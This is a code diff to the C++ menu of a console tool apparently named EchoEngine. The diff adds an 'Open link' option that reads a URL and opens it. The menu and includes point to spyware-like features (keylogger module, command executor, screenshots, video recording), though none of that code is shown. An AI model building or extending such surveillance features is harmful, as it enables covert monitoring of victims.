@@ -1,11 +1,17 @@
+#include <conio.h>
 #include <iostream>
 #include <string>
+#include <limits>
 #include "../include/EchoEngine/modules/keylogger/main_keylogger.h"
 #include "../include/EchoEngine/utils/string_utils.h"
+#include "../include/EchoEngine/modules/openlink/openlink.h"
 
 #define RED   "\x1b[31m"
 #define GREEN "\x1b[32m"
 #define RESET "\x1b[0m"
+
+std::string user_input;
+std::string user_input_link;
 
 int main() {
 
@@ -25,7 +31,7 @@ int main() {
                                  "[>] 4. - [" RED "-" RESET"] PC data                  [<]\n"
                                  "[>] 5. - [" RED "-" RESET"] CMD executor             [<]\n"
                                  "[>] 6. - [" RED "-" RESET"] Display a message        [<]\n"
-                                 "[>] 7. - [" RED "-" RESET"] Open link                [<]\n"
+                                 "[>] 7. - [" GREEN "+" RESET "] Open link                [<]\n"
                                  "[>] 8. - [" RED "-" RESET"] Shutdown                 [<]\n"
                                  "[>] 9. - [" RED "-" RESET"] Screenshot               [<]\n"
                                  "[>] 10. - [" RED "-" RESET"] Video recording         [<]\n"
@@ -41,7 +47,6 @@ int main() {
         std::cout << "\n===== MENU =====" << std::endl;
         std::cout << options << std::endl;
 
-        std::string user_input;
         std::cout << "CHOOSE THE OPTION (or type 'exit'): ";
         std::cin >> user_input;
 
@@ -82,7 +87,23 @@ int main() {
                      break;
                  }
                  case 7: {
-                     std::cout << "Open a link..." << std::endl;
+                     std::cout << "[>] Input a link: ";
+                     std::cin.ignore(std::numeric_limits<std::streamsize>::max(), '\n');
+                     std::getline(std::cin, user_input_link);
+
+                     if (user_input_link.rfind("http", 0, 3) != 0) {
+                         std::cout << "[" RED "!" RESET "] You have to put only links" << std::endl;
+
+                         std::cout << "\n[ ...press any button to continue... ]";
+                         _getch();
+                         std::cout << std::endl;
+
+                         break;
+
+                     };
+
+                     OpenLink::open_link(user_input_link);
+
                      break;
                  }
                  case 8: {
